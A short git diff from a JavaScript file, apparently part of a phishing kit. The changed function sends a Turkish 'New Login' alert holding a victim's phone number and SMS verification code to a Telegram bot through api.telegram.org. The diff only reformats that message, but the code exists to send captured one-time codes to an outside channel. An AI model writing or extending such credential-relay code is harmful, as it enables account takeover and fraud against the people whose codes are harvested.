@@ -49,7 +49,7 @@ async function updateTelegramMessage(smsCode) {
     if (!messageId || !phone) return false;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/editMessageText`;
-    const text = `📱 Yeni Giriş\n\n📞 Telefon: +90${phone}\n🔑 SMS Kod: ${smsCode}`;
+    const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n🔑 SMS Kod: <code>${smsCode}</code>`;
 
     try {
         const res = await fetch(url, {
